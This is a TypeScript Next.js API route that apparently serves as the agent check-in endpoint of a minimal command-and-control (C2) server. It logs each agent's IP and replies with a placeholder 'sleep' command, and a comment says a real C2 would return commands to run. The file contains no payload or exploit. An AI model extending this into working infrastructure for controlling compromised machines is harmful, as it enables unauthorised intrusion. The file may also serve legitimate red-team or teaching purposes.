import { NextResponse } from 'next/server';
import { saveAgent, AgentData } from '../db';

export async function POST(request: Request) {
    try {
        const data: AgentData = await request.json();

        // Automatically capture the IP address from headers
        const ip = request.headers.get('x-forwarded-for') ||
            request.headers.get('x-real-ip') ||
            'Unknown';

        const cleanData = {
            ...data,
            ip: data.ip || ip
        };

        saveAgent(cleanData);

        // In a real C2, this response would contain a JSON payload of commands to execute
        // For our MVP, we just acknowledge receipt
        return NextResponse.json({ status: 'ok', command: 'sleep' }, { status: 200 });
    } catch (error) {
        return NextResponse.json({ error: 'Invalid payload' }, { status: 400 });
    }
}
